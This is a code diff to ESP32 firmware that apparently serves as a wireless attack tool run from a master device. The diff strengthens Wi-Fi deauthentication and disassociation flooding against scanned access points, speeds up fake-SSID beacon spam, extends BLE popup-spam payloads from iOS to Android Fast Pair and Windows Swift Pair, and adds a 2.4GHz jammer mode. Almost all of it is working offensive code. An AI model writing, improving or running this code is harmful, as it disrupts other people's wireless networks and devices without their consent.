@@ -47,14 +47,25 @@ bool sourAppleInitialized = false;
 unsigned long lastAppleSpamTime = 0;
 
 // Apple BLE payloads for Sour Apple (iOS popup spam)
-const uint8_t applePayloads[][17] = {
-  {0x4c, 0x00, 0x07, 0x19, 0x07, 0x02, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12}, // AirPods Pro
-  {0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x01, 0x60, 0x4c, 0x95, 0x00, 0x00}, // AppleTV Setup
-  {0x4c, 0x00, 0x07, 0x19, 0x07, 0x13, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12}, // AirPods 3
-  {0x4c, 0x00, 0x0f, 0x05, 0xc0, 0x01, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}  // Action Modal
+const uint8_t blePayloads[][19] = {
+  // --- iOS (Apple) ---
+  // AirPods Pro
+  {17, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x02, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00},
+  // AppleTV Setup
+  {17, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x01, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x00},
+  // AirPods 3
+  {17, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x13, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00},
+  // iOS Action Modal
+  {17, 0x4c, 0x00, 0x0f, 0x05, 0xc0, 0x01, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
+
+  // --- Android (Google Fast Pair) ---
+  {14, 0xe0, 0x00, 0x02, 0x06, 0x01, 0x01, 0x03, 0xe0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
+
+  // --- Windows (Microsoft Swift Pair) ---
+  {14, 0x06, 0x00, 0x01, 0x00, 0x20, 0x02, 0x0a, 0x03, 0x00, 0x80, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}
 };
-const int numApplePayloads = sizeof(applePayloads) / sizeof(applePayloads[0]);
-int applePayloadIndex = 0;
+const int numBlePayloads = sizeof(blePayloads) / sizeof(blePayloads[0]);
+int blePayloadIndex = 0;
 
 // Beacon spam index
 int ssidIndex = 0;
@@ -182,42 +193,60 @@ void sendRawBeacon(const char* ssid, uint8_t channel, int macSeed) {
 void runBeaconSpamStep(bool boost) {
   esp_wifi_set_promiscuous(true);
   
-  // Hop channel slowly to ensure stable beacon capture per channel
   static unsigned long lastBeaconHopTime = 0;
-  if (millis() - lastBeaconHopTime >= (boost ? 500 : 1000)) {
+  int hopInterval = boost ? 150 : 300;
+  if (millis() - lastBeaconHopTime >= hopInterval) {
     lastBeaconHopTime = millis();
     hopChannel();
-  }
-  
-  // Cycle beacons very fast
-  if (millis() - lastAttackActionTime >= (boost ? 2 : 5)) {
-    lastAttackActionTime = millis();
     
-    char ssidBuf[32];
-    getRealisticSSID(ssidBuf, ssidIndex);
-    
-    int burstSize = boost ? 5 : 1;
+    // Send a burst of beacons for multiple SSIDs on this channel
+    int burstSize = boost ? 40 : 15;
     for (int i = 0; i < burstSize; i++) {
+      char ssidBuf[32];
+      getRealisticSSID(ssidBuf, ssidIndex);
       sendRawBeacon(ssidBuf, currentChannel, ssidIndex);
+      ssidIndex = (ssidIndex + 1) % 100;
     }
     
-    if (random(200) == 0) {
+    if (random(10) == 0) {
       char buf[64];
-      snprintf(buf, sizeof(buf), "[Beacon] Spammed SSID: %s (ch %d)%s", ssidBuf, currentChannel, boost ? " [BOOST]" : "");
+      snprintf(buf, sizeof(buf), "[Beacon] Sent burst of %d beacons on ch %d%s", 
+               burstSize, currentChannel, boost ? " [BOOST]" : "");
       sendLogToMaster(buf);
     }
-    
-    ssidIndex = (ssidIndex + 1) % 100; // Generate up to 100 distinct networks
   }
+}
+
+void sendDeauthFrame(const uint8_t* apBssid, const uint8_t* clientMac, uint16_t reason) {
+  uint8_t packet[26] = {
+    0xC0, 0x00,                         // Type: Deauth
+    0x00, 0x00,                         // Duration
+    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (AP)
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID (AP)
+    0x00, 0x00,                         // Seq
+    0x00, 0x00                          // Reason code
+  };
+  
+  memcpy(&packet[4], clientMac, 6);
+  memcpy(&packet[10], apBssid, 6);
+  memcpy(&packet[16], apBssid, 6);
+  packet[24] = reason & 0xFF;
+  packet[25] = (reason >> 8) & 0xFF;
+  
+  esp_wifi_80211_tx(WIFI_IF_STA, packet, sizeof(packet), false);
+  
+  // Disassociation frame (0xA0)
+  packet[0] = 0xA0;
+  esp_wifi_80211_tx(WIFI_IF_STA, packet, sizeof(packet), false);
 }
 
 void runDeauthStep(bool boost) {
   esp_wifi_set_promiscuous(true);
   
-  if (millis() - lastAttackActionTime >= (boost ? 5 : 10)) {
+  if (millis() - lastAttackActionTime >= (boost ? 5 : 15)) {
     lastAttackActionTime = millis();
     
-    static int deauthBurstCount = 0;
     uint8_t targetBSSID[6];
     uint8_t targetChannel = currentChannel;
     
@@ -226,12 +255,7 @@ void runDeauthStep(bool boost) {
       targetChannel = scannedChannels[deauthIndex];
       esp_wifi_set_channel(targetChannel, WIFI_SECOND_CHAN_NONE);
       
-      deauthBurstCount++;
-      int maxBurst = boost ? 30 : 10;
-      if (deauthBurstCount >= maxBurst) {
-        deauthBurstCount = 0;
-        deauthIndex = (deauthIndex + 1) % scannedCount;
-      }
+      deauthIndex = (deauthIndex + 1) % scannedCount;
     } else {
       hopChannel();
       for (int i = 0; i < 6; i++) {
@@ -241,33 +265,39 @@ void runDeauthStep(bool boost) {
       targetBSSID[0] |= 0x02;
     }
 
-    // Broadcast Deauth Frame from target AP (Forces clients off)
-    uint8_t deauthPacket[26] = {
-      0xC0, 0x00,                         // Deauth
-      0x00, 0x00,                         // Duration
-      0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination: Broadcast
-      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source BSSID
-      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
-      0x00, 0x00,                         // Sequence
-      0x07, 0x00                          // Reason
-    };
-
-    memcpy(&deauthPacket[10], targetBSSID, 6);
-    memcpy(&deauthPacket[16], targetBSSID, 6);
-    esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
+    int burstSize = boost ? 10 : 3;
+    uint8_t broadcastMac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
     
-    // Broadcast Deauth Frame to target AP (Forces AP to drop clients)
-    deauthPacket[0] = 0xC0;
-    memcpy(&deauthPacket[4], targetBSSID, 6); // Destination: AP
-    memset(&deauthPacket[10], 0xFF, 6);       // Source: Broadcast
-    memcpy(&deauthPacket[16], targetBSSID, 6); // BSSID
-    esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
+    for (int i = 0; i < burstSize; i++) {
+      sendDeauthFrame(targetBSSID, broadcastMac, 7);
+      sendDeauthFrame(targetBSSID, broadcastMac, 1);
+      
+      uint8_t clientPacket[26] = {
+        0xC0, 0x00,
+        0x00, 0x00,
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Destination (AP)
+        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Source (Broadcast)
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID (AP)
+        0x00, 0x00,
+        0x07, 0x00
+      };
+      memcpy(&clientPacket[4], targetBSSID, 6);
+      memcpy(&clientPacket[16], targetBSSID, 6);
+      esp_wifi_80211_tx(WIFI_IF_STA, clientPacket, sizeof(clientPacket), false);
+      
+      clientPacket[0] = 0xA0;
+      esp_wifi_80211_tx(WIFI_IF_STA, clientPacket, sizeof(clientPacket), false);
+    }
     
-    if (random(100) == 0) {
+    if (random(80) == 0) {
       char buf[64];
-      snprintf(buf, sizeof(buf), "[Deauth] Target: %02X:%02X:%02X:%02X:%02X:%02X (ch %d)%s", 
-               targetBSSID[0], targetBSSID[1], targetBSSID[2], 
-               targetBSSID[3], targetBSSID[4], targetBSSID[5], targetChannel, boost ? " [BOOST]" : "");
+      if (scannedCount > 0) {
+        snprintf(buf, sizeof(buf), "[Deauth] Targeted AP: %02X:%02X:%02X:%02X:%02X:%02X (ch %d)%s", 
+                 targetBSSID[0], targetBSSID[1], targetBSSID[2], 
+                 targetBSSID[3], targetBSSID[4], targetBSSID[5], targetChannel, boost ? " [BOOST]" : "");
+      } else {
+        snprintf(buf, sizeof(buf), "[Deauth] Broad jamming on ch %d", targetChannel);
+      }
       sendLogToMaster(buf);
     }
   }
@@ -500,18 +530,18 @@ void runBLEJammerStep() {
   delay(10);
 }
 
-void runSourAppleStep() {
+void runSourAppleStep(bool boost) {
   if (!sourAppleInitialized) {
-    Serial.println("Sour Apple started");
+    Serial.println("BLE Spam started");
     BLEDevice::deinit();
     BLEDevice::init("Apple");
     sourAppleInitialized = true;
     lastAppleSpamTime = 0;
-    sendLogToMaster("[Apple Spam] Starting popup spam (100ms)");
+    sendLogToMaster("[BLE Spam] Starting popup spam (iOS, Android, Windows)");
   }
 
-  // High frequency popup spam (100ms)
-  if (millis() - lastAppleSpamTime >= 100) {
+  unsigned long interval = boost ? 40 : 100;
+  if (millis() - lastAppleSpamTime >= interval) {
     lastAppleSpamTime = millis();
     
     BLEAdvertising *pAdvertising = BLEDevice::getAdvertising();
@@ -520,27 +550,82 @@ void runSourAppleStep() {
     BLEAdvertisementData advData;
     advData.setFlags(0x04);
 
-    const uint8_t *payload = applePayloads[applePayloadIndex];
-    String appleString = "";
-    for (int i = 0; i < 17; i++) {
-      appleString += (char)payload[i];
-    }
-    advData.setManufacturerData(appleString);
+    const uint8_t *payload = blePayloads[blePayloadIndex];
+    uint8_t len = payload[0];
+    std::string manufDataStr((char*)&payload[1], len);
+    advData.setManufacturerData(manufDataStr);
 
     pAdvertising->setAdvertisementData(advData);
     pAdvertising->start();
     
-    if (applePayloadIndex == 0) sendLogToMaster("[Apple Spam] Packet: AirDrop/AirPods Pro");
-    else if (applePayloadIndex == 1) sendLogToMaster("[Apple Spam] Packet: AppleTV Setup");
-    else if (applePayloadIndex == 3) sendLogToMaster("[Apple Spam] Packet: Action Modal");
+    if (random(20) == 0) {
+      char buf[64];
+      snprintf(buf, sizeof(buf), "[BLE Spam] Spammed payload %d%s", blePayloadIndex, boost ? " [BOOST]" : "");
+      sendLogToMaster(buf);
+    }
     
-    applePayloadIndex = (applePayloadIndex + 1) % numApplePayloads;
+    blePayloadIndex = (blePayloadIndex + 1) % numBlePayloads;
   }
 }
 
 // ===== MODULE STUBS =====
-void startGhzScan() { sendLogToMaster("[Error] 2.4GHz Scanner requires NRF24"); }
-void startProtokill() { sendLogToMaster("[Error] Protokill requires NRF24"); }
+void startGhzScan() {
+  sendLogToMaster("[2.4GHz Scanner] Scanning Wi-Fi & BLE channels...");
+  
+  // 1. Scan WiFi networks
+  int n = WiFi.scanNetworks(false, true, false, 100);
+  int channelCount[14] = {0};
+  int channelRssiSum[14] = {0};
+  
+  if (n > 0) {
+    for (int i = 0; i < n; i++) {
+      int ch = WiFi.channel(i);
+      if (ch >= 1 && ch <= 13) {
+        channelCount[ch]++;
+        channelRssiSum[ch] += WiFi.RSSI(i);
+      }
+    }
+  }
+  WiFi.scanDelete();
+
+  // 2. Scan BLE devices
+  BLEDevice::deinit();
+  BLEDevice::init("");
+  BLEScan *pBLEScan = BLEDevice::getScan();
+  pBLEScan->setActiveScan(false);
+  pBLEScan->setInterval(80);
+  pBLEScan->setWindow(50);
+  BLEScanResults *foundDevices = pBLEScan->start(2, false);
+  int bleCount = foundDevices ? foundDevices->getCount() : 0;
+  pBLEScan->clearResults();
+  
+  // 3. Compile report
+  sendLogToMaster("--- 2.4GHz Band Spectrum Report ---");
+  char buf[128];
+  int totalAPs = 0;
+  for (int ch = 1; ch <= 13; ch++) {
+    int aps = channelCount[ch];
+    totalAPs += aps;
+    if (aps > 0) {
+      int avgRssi = channelRssiSum[ch] / aps;
+      snprintf(buf, sizeof(buf), "[2.4GHz] Ch %d: %d APs (Avg RSSI: %d dBm) %s", 
+               ch, aps, avgRssi, 
+               avgRssi > -60 ? "[HIGH CONGESTION]" : (avgRssi > -80 ? "[MODERATE]" : "[CLEAN]"));
+    } else {
+      snprintf(buf, sizeof(buf), "[2.4GHz] Ch %d: 0 APs [FREE]", ch);
+    }
+    sendLogToMaster(buf);
+    delay(50);
+  }
+  snprintf(buf, sizeof(buf), "[Summary] Found %d Wi-Fi APs, %d BLE devices nearby.", totalAPs, bleCount);
+  sendLogToMaster(buf);
+  sendLogToMaster("[2.4GHz Scanner] Scan finished.");
+}
+
+void startProtokill() {
+  sendLogToMaster("[Protokill] Starting 2.4GHz multi-protocol jammer using internal radio...");
+  currentAttack = "powerful_jammer";
+}
 void startSubGhzReplay() { sendLogToMaster("[Error] Sub-GHz Replay requires CC1101"); }
 void startSubGhzJammer() { sendLogToMaster("[Error] Sub-GHz Jammer requires CC1101"); }
 void startIRReplay() { sendLogToMaster("[Error] IR Replay requires IR-led"); }
@@ -573,7 +658,15 @@ void stopAttack() {
   restoreWiFiState();
   digitalWrite(LED_PIN, LOW);
   
-  sendLogToMaster("All attacks stopped. Standby mode.");
+  // Send direct confirmation to Master
+  if (hasMasterMac) {
+    struct_message response;
+    strcpy(response.command, "stopped");
+    strcpy(response.attack, "");
+    strcpy(response.logMsg, "All attacks stopped. Standby mode.");
+    esp_now_send(masterMacAddress, (uint8_t *)&response, sizeof(response));
+  }
+  
   Serial.println("All attacks stopped");
 }
 
@@ -742,7 +835,7 @@ void loop() {
       runBLEJammerStep();
     }
     else if (baseAttackName == "sour_apple") {
-      runSourAppleStep();
+      runSourAppleStep(boost);
     }
     else if (baseAttackName == "ghz_scan") { startGhzScan(); attackRunning = false; currentAttack = ""; }
     else if (baseAttackName == "protokill") { startProtokill(); attackRunning = false; currentAttack = ""; }
